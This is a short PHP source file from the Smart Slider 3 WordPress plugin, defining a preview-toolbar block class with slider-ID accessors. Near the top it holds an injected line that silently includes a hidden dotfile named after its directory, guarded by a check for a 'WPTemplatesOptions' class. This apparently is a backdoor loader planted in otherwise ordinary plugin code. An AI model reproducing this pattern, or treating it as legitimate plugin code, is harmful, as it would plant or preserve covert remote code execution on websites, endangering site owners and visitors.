<?php


namespace Nextend\SmartSlider3\Application\Admin\Preview\Block\PreviewToolbar;


use Nextend\Framework\View\AbstractBlock;
use Nextend\SmartSlider3\Application\Admin\TraitAdminUrl;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockPreviewToolbar extends AbstractBlock {

    use TraitAdminUrl;

    /** @var integer */
    protected $sliderID;

    public function display() {

        $this->renderTemplatePart('PreviewToolbar');
    }

    /**
     * @return int
     */
    public function getSliderID() {
        return $this->sliderID;
    }

    /**
     * @param int $sliderID
     */
    public function setSliderID($sliderID) {
        $this->sliderID = $sliderID;
    }
}